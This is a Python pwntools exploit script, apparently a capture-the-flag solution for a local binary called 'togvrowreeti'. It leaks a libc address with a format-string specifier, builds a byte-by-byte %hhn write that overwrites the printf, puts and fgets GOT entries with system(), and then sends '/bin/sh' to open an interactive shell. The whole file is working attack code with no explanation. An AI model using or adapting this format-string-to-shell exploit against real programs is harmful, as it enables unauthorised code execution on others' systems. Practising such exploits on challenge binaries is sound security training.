from pwn import *

io = process("./togvrowreeti")
elf = context.binary = ELF('./togvrowreeti')
libc = elf.libc
# io = gdb.debug("./togvrowreeti", '''
# b *0x00000000004011c3
# c''')
context.log_level = 'debug'
payload = '%59$p'
io.sendline(payload)
libc.address = int(io.recvline().decode().strip(), 16) - 0x25883c
print(hex(libc.address))

def formatthingy(base, f, g):
    payload = b''
    l = {}
    x = []
    z = []
    y = []
    for i in range(len(f)//8):
        x.append(hex(u64(f[i*8:8+(i*8)]))[2:].rjust(16, '0'))
        z.append(u64(g[i*8:8+(i*8)]))
    print(x)
    print(z)
    for j in range(len(x)):
        for i in range(8):
            if i == 0:
                l[z[j]+i] = int(x[j][-2-(i*2):], 16)
                y.append(int(x[j][-2-(i*2):], 16))
            else:
                l[z[j]+i] = int(x[j][-2-(i*2):-(i*2)], 16)
                y.append(int(x[j][-2-(i*2):-(i*2)], 16))
    t = []
    for i in range(len(y)):
        t.append(0)
    y.sort()

    for i in range(len(y)):
        if i == 0:
            if y[i] == 0:
                payload += "%0$hhn".format(y[i]).encode()
            else: 
                payload += "%{0}c%0$hhn".format(y[i]).encode()
        else:
            if y[i] == y[i-1]:
                payload += "%0$hhn".encode()
            else:
                payload += "%{0}c%0$hhn".format(y[i]-y[i-1]).encode()
    payload += b'a'*(8-(len(payload)%8))
    offset = (len(payload)//8)+base
    for i in range(2):
        payload = b''
        for i in range(len(y)):
            if i == 0:
                if y[i] == 0:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i], offset).encode()
                    offset += 1
            else:
                if y[i] == 0 or y[i] == y[i-1]:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i]-y[i-1], offset).encode()
                    offset += 1
        payload += b'a'*(8-(len(payload)%8))
        offset = (len(payload)//8)+base
    print(l)
    for i in range(len(y)):
        x = (list(l.keys())[list(l.values()).index(y[i])])
        payload += p64(x)
        l.pop(x)
    io.sendline(payload)
print(hex(libc.symbols['system']))
q = p64(libc.symbols['system'])
q += p64(libc.symbols['system'])
q += p64(libc.symbols['system'])
w = p64(elf.got['printf'])
w += p64(elf.got['puts'])
w += p64(elf.got['fgets'])
formatthingy(6, q, w)
io.clean()
io.sendline("/bin/sh")
io.interactive()

'''
inp = 5

'''